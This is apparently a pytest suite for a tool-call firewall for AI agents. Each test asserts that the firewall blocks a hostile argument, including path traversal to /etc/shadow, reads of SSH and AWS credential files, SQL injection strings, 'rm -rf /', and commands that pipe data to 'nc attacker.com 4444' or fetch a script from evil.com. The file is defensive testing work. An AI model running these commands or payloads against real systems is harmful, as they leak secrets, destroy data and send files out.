"""
Tests for ToolGuard — tool-level firewall.

Covers: path traversal, SQL injection, command injection,
privilege escalation, resource abuse, sensitive file access,
destructive operations, sandbox enforcement.
"""

import pytest
import time
from secureagent.toolguard import (
    ToolGuard, ToolCallVerdict, ToolPolicy, Permission,
    ViolationType, PERMISSION_HIERARCHY,
)


# ═══════════════════════════════════════════════════════════
#  PATH TRAVERSAL (like directory traversal in web apps)
# ═══════════════════════════════════════════════════════════

class TestPathTraversal:
    """Test path traversal detection — the #1 structural attack."""

    def setup_method(self):
        self.guard = ToolGuard()
        self.guard.register_tool("read_file")

    def test_blocks_dot_dot_slash(self):
        v = self.guard.validate_call("read_file", {"path": "../../etc/passwd"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PATH_TRAVERSAL

    def test_blocks_dot_dot_backslash(self):
        v = self.guard.validate_call("read_file", {"path": "..\\..\\Windows\\System32\\config\\SAM"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PATH_TRAVERSAL

    def test_blocks_url_encoded_traversal(self):
        v = self.guard.validate_call("read_file", {"path": "..%2F..%2Fetc%2Fpasswd"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PATH_TRAVERSAL

    def test_blocks_null_byte_injection(self):
        v = self.guard.validate_call("read_file", {"path": "file.txt%00.jpg"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PATH_TRAVERSAL

    def test_allows_normal_relative_path(self):
        v = self.guard.validate_call("read_file", {"path": "./project/data.txt"})
        assert v.allowed

    def test_allows_simple_filename(self):
        v = self.guard.validate_call("read_file", {"path": "report.csv"})
        assert v.allowed

    def test_blocks_standalone_dot_dot(self):
        v = self.guard.validate_call("read_file", {"path": "/var/log/../../../etc/shadow"})
        assert not v.allowed


# ═══════════════════════════════════════════════════════════
#  SENSITIVE FILE ACCESS
# ═══════════════════════════════════════════════════════════

class TestSensitiveFiles:
    """Test blocking access to sensitive system files."""

    def setup_method(self):
        self.guard = ToolGuard()
        self.guard.register_tool("read_file")

    def test_blocks_etc_passwd(self):
        v = self.guard.validate_call("read_file", {"path": "/etc/passwd"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_etc_shadow(self):
        v = self.guard.validate_call("read_file", {"path": "/etc/shadow"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_ssh_keys(self):
        v = self.guard.validate_call("read_file", {"path": "~/.ssh/id_rsa"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_env_files(self):
        v = self.guard.validate_call("read_file", {"path": "/app/project/.env"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_pem_files(self):
        v = self.guard.validate_call("read_file", {"path": "/certs/server.pem"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_aws_credentials(self):
        v = self.guard.validate_call("read_file", {"path": "~/.aws/credentials"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_git_config(self):
        v = self.guard.validate_call("read_file", {"path": "/repo/.git/config"})
        assert not v.allowed
        assert v.violation_type == ViolationType.SENSITIVE_ACCESS

    def test_blocks_proc_environ(self):
        v = self.guard.validate_call("read_file", {"path": "/proc/self/environ"})
        assert not v.allowed

    def test_allows_normal_project_files(self):
        v = self.guard.validate_call("read_file", {"path": "./src/main.py"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  SQL INJECTION (same concept, applied to agent tool args)
# ═══════════════════════════════════════════════════════════

class TestSQLInjection:
    """Test SQL injection detection in tool arguments."""

    def setup_method(self):
        self.guard = ToolGuard()
        self.guard.register_tool("query_db")

    def test_blocks_drop_table(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT * FROM users; DROP TABLE users"})
        assert not v.allowed
        assert v.violation_type == ViolationType.ARGUMENT_INJECTION

    def test_blocks_union_select(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT name FROM users UNION SELECT password FROM credentials"})
        assert not v.allowed
        assert v.violation_type == ViolationType.ARGUMENT_INJECTION

    def test_blocks_or_1_equals_1(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT * FROM users WHERE id = '' OR '1'='1'"})
        assert not v.allowed
        assert v.violation_type == ViolationType.ARGUMENT_INJECTION

    def test_blocks_into_outfile(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT * FROM users INTO OUTFILE '/tmp/dump.csv'"})
        assert not v.allowed
        assert v.violation_type == ViolationType.ARGUMENT_INJECTION

    def test_blocks_xp_cmdshell(self):
        v = self.guard.validate_call("query_db", {"query": "EXEC xp_cmdshell('whoami')"})
        assert not v.allowed

    def test_blocks_sleep_timing_attack(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT * FROM users WHERE id=1 AND SLEEP(5)"})
        assert not v.allowed

    def test_blocks_load_file(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT LOAD_FILE('/etc/passwd')"})
        assert not v.allowed

    def test_allows_normal_select(self):
        v = self.guard.validate_call("query_db", {"query": "SELECT name, email FROM users WHERE active = 1"})
        assert v.allowed

    def test_allows_normal_insert(self):
        v = self.guard.validate_call("query_db", {"query": "INSERT INTO logs (action, ts) VALUES ('login', NOW())"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  COMMAND INJECTION
# ═══════════════════════════════════════════════════════════

class TestCommandInjection:
    """Test command injection detection — when tools accept commands."""

    def setup_method(self):
        self.guard = ToolGuard()
        self.guard.register_tool("run_script", {"allow_shell_commands": False})

    def test_blocks_semicolon_chaining(self):
        v = self.guard.validate_call("run_script", {"command": "echo hello; rm -rf /"})
        assert not v.allowed
        assert v.violation_type == ViolationType.ARGUMENT_INJECTION

    def test_blocks_pipe_injection(self):
        v = self.guard.validate_call("run_script", {"command": "cat file | nc attacker.com 4444"})
        assert not v.allowed

    def test_blocks_command_substitution(self):
        v = self.guard.validate_call("run_script", {"command": "echo $(cat /etc/passwd)"})
        assert not v.allowed

    def test_blocks_backtick_substitution(self):
        v = self.guard.validate_call("run_script", {"command": "echo `whoami`"})
        assert not v.allowed

    def test_blocks_curl_in_command(self):
        v = self.guard.validate_call("run_script", {"command": "curl http://evil.com/shell.sh"})
        assert not v.allowed

    def test_blocks_rm_rf(self):
        v = self.guard.validate_call("run_script", {"command": "rm -rf /important/data"})
        assert not v.allowed

    def test_blocks_sudo(self):
        v = self.guard.validate_call("run_script", {"command": "sudo chmod 777 /etc/shadow"})
        assert not v.allowed

    def test_blocks_python_exec(self):
        v = self.guard.validate_call("run_script", {"command": "python -c 'import os; os.system(\"whoami\")'"})
        assert not v.allowed

    def test_allows_safe_command_when_shell_enabled(self):
        """If shell commands are explicitly allowed, only injection is blocked."""
        self.guard.register_tool("safe_shell", {"allow_shell_commands": True})
        v = self.guard.validate_call("safe_shell", {"command": "echo hello world"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════

class TestPrivilegeEscalation:
    """Test permission-based access control."""

    def test_read_agent_cannot_delete(self):
        guard = ToolGuard(agent_permission=Permission.READ)
        guard.register_tool("delete_file", {"permission": "delete"})
        v = guard.validate_call("delete_file", {"path": "test.txt"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PRIVILEGE_ESCALATION

    def test_read_agent_can_read(self):
        guard = ToolGuard(agent_permission=Permission.READ)
        guard.register_tool("read_file", {"permission": "read"})
        v = guard.validate_call("read_file", {"path": "test.txt"})
        assert v.allowed

    def test_write_agent_can_read_and_write(self):
        guard = ToolGuard(agent_permission=Permission.WRITE)
        guard.register_tool("read_file", {"permission": "read"})
        guard.register_tool("write_file", {"permission": "write"})
        assert guard.validate_call("read_file", {"path": "a.txt"}).allowed
        assert guard.validate_call("write_file", {"path": "b.txt"}).allowed

    def test_write_agent_cannot_execute(self):
        guard = ToolGuard(agent_permission=Permission.WRITE)
        guard.register_tool("exec_code", {"permission": "execute"})
        v = guard.validate_call("exec_code", {"code": "print('hi')"})
        assert not v.allowed
        assert v.violation_type == ViolationType.PRIVILEGE_ESCALATION

    def test_admin_can_do_everything(self):
        guard = ToolGuard(agent_permission=Permission.ADMIN)
        guard.register_tool("delete_all", {"permission": "delete"})
        v = guard.validate_call("delete_all", {})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  SANDBOX ENFORCEMENT
# ═══════════════════════════════════════════════════════════

class TestSandbox:
    """Test filesystem sandbox enforcement."""

    def test_blocks_path_outside_sandbox(self):
        guard = ToolGuard(sandbox_root="./project")
        guard.register_tool("read_file")
        v = guard.validate_call("read_file", {"path": "/etc/hosts"})
        assert not v.allowed
        # Could be PATH_TRAVERSAL (sandbox) or SENSITIVE_ACCESS (/etc/hosts)
        assert v.violation_type in (ViolationType.PATH_TRAVERSAL, ViolationType.SENSITIVE_ACCESS)

    def test_allows_path_inside_sandbox(self):
        guard = ToolGuard(sandbox_root=".")
        guard.register_tool("read_file")
        v = guard.validate_call("read_file", {"path": "./src/main.py"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  STRICT MODE & BLOCKED TOOLS
# ═══════════════════════════════════════════════════════════

class TestStrictMode:
    """Test strict tool registration mode."""

    def test_strict_blocks_unknown_tools(self):
        guard = ToolGuard(strict_mode=True)
        v = guard.validate_call("unknown_tool", {})
        assert not v.allowed
        assert v.violation_type == ViolationType.UNKNOWN_TOOL

    def test_normal_allows_unknown_tools(self):
        guard = ToolGuard(strict_mode=False)
        v = guard.validate_call("unknown_tool", {})
        assert v.allowed

    def test_explicitly_blocked_tool(self):
        guard = ToolGuard()
        guard.block_tool("dangerous_tool")
        v = guard.validate_call("dangerous_tool", {})
        assert not v.allowed
        assert v.violation_type == ViolationType.BLOCKED_TOOL


# ═══════════════════════════════════════════════════════════
#  RESOURCE ABUSE (per-tool rate limiting)
# ═══════════════════════════════════════════════════════════

class TestResourceAbuse:
    """Test per-tool rate limiting and session limits."""

    def test_session_limit_exceeded(self):
        guard = ToolGuard()
        guard.register_tool("spam_tool", {"max_calls_per_session": 3})

        assert guard.validate_call("spam_tool", {}).allowed
        assert guard.validate_call("spam_tool", {}).allowed
        assert guard.validate_call("spam_tool", {}).allowed
        v = guard.validate_call("spam_tool", {})
        assert not v.allowed
        assert v.violation_type == ViolationType.RESOURCE_ABUSE

    def test_arg_length_limit(self):
        guard = ToolGuard()
        guard.register_tool("small_tool", {"max_arg_length": 50})
        v = guard.validate_call("small_tool", {"data": "A" * 100})
        assert not v.allowed

    def test_blocked_arg_values(self):
        guard = ToolGuard()
        guard.register_tool("query_tool", {
            "blocked_args": {"table": ["users", "credentials", "secrets"]}
        })
        v = guard.validate_call("query_tool", {"table": "users"})
        assert not v.allowed

    def test_required_args_missing(self):
        guard = ToolGuard()
        guard.register_tool("safe_tool", {"required_args": ["user_id", "reason"]})
        v = guard.validate_call("safe_tool", {"user_id": "123"})
        assert not v.allowed


# ═══════════════════════════════════════════════════════════
#  DESTRUCTIVE OPERATIONS
# ═══════════════════════════════════════════════════════════

class TestDestructiveOps:
    """Test detection of destructive operations."""

    def setup_method(self):
        self.guard = ToolGuard()
        self.guard.register_tool("run_query")
        self.guard.register_tool("exec_command")

    def test_blocks_drop_table(self):
        v = self.guard.validate_call("run_query", {"query": "DROP TABLE users"})
        assert not v.allowed
        assert v.violation_type == ViolationType.DESTRUCTIVE_OP

    def test_blocks_truncate(self):
        v = self.guard.validate_call("run_query", {"query": "TRUNCATE TABLE orders"})
        assert not v.allowed

    def test_blocks_rm_rf_root(self):
        v = self.guard.validate_call("exec_command", {"command": "rm -rf /"})
        assert not v.allowed

    def test_blocks_shutdown(self):
        v = self.guard.validate_call("exec_command", {"command": "shutdown now"})
        assert not v.allowed

    def test_tool_marked_destructive(self):
        self.guard.register_tool("nuke_db", {"is_destructive": True})
        v = self.guard.validate_call("nuke_db", {})
        assert not v.allowed
        assert v.violation_type == ViolationType.DESTRUCTIVE_OP


# ═══════════════════════════════════════════════════════════
#  URL IN NON-NETWORK TOOLS
# ═══════════════════════════════════════════════════════════

class TestUnexpectedURLs:
    """Test that non-network tools can't receive URLs in args."""

    def test_blocks_url_in_file_tool(self):
        guard = ToolGuard()
        guard.register_tool("write_file", {"allow_external_urls": False})
        v = guard.validate_call("write_file", {"content": "Visit https://evil.com/shell for setup"})
        assert not v.allowed

    def test_allows_url_in_network_tool(self):
        guard = ToolGuard()
        guard.register_tool("fetch_url", {"allow_external_urls": True})
        v = guard.validate_call("fetch_url", {"url": "https://api.example.com/data"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  POLICY-LEVEL PATH RESTRICTIONS
# ═══════════════════════════════════════════════════════════

class TestPolicyPaths:
    """Test per-tool allowed/blocked path lists."""

    def test_blocked_paths_in_policy(self):
        guard = ToolGuard()
        guard.register_tool("read_file", {
            "blocked_paths": ["/var/log/**", "/tmp/**"],
        })
        v = guard.validate_call("read_file", {"path": "/var/log/auth.log"})
        assert not v.allowed

    def test_allowed_paths_whitelist(self):
        guard = ToolGuard()
        guard.register_tool("read_file", {
            "allowed_paths": ["./src/**", "./docs/**"],
        })
        v = guard.validate_call("read_file", {"path": "./data/passwords.txt"})
        assert not v.allowed

    def test_allowed_paths_permits_match(self):
        guard = ToolGuard()
        guard.register_tool("read_file", {
            "allowed_paths": ["./src/**", "./docs/**"],
        })
        v = guard.validate_call("read_file", {"path": "./src/main.py"})
        assert v.allowed


# ═══════════════════════════════════════════════════════════
#  EDGE CASES
# ═══════════════════════════════════════════════════════════

class TestEdgeCases:
    """Test edge cases and robustness."""

    def test_empty_args_are_fine(self):
        guard = ToolGuard()
        guard.register_tool("ping")
        v = guard.validate_call("ping", {})
        assert v.allowed

    def test_non_string_args_converted(self):
        guard = ToolGuard()
        guard.register_tool("query", {"max_arg_length": 5})
        v = guard.validate_call("query", {"limit": 12345678})
        assert not v.allowed  # "12345678" > 5 chars

    def test_verdict_to_dict(self):
        guard = ToolGuard()
        guard.block_tool("evil")
        v = guard.validate_call("evil", {})
        d = v.to_dict()
        assert d["allowed"] is False
        assert d["violation_type"] == "blocked_tool"

    def test_register_multiple_tools(self):
        guard = ToolGuard()
        guard.register_tools({
            "read_file": {"permission": "read"},
            "write_file": {"permission": "write"},
            "delete_file": {"permission": "delete"},
        })
        assert len(guard.policies) == 3

    def test_get_stats(self):
        guard = ToolGuard(agent_permission=Permission.WRITE)
        guard.register_tool("test_tool")
        guard.validate_call("test_tool", {})
        stats = guard.get_stats()
        assert "test_tool" in stats["registered_tools"]
        assert stats["agent_permission"] == "write"

    def test_reset_counters(self):
        guard = ToolGuard()
        guard.register_tool("tool", {"max_calls_per_session": 2})
        guard.validate_call("tool", {})
        guard.validate_call("tool", {})
        assert not guard.validate_call("tool", {}).allowed
        guard.reset_counters()
        assert guard.validate_call("tool", {}).allowed
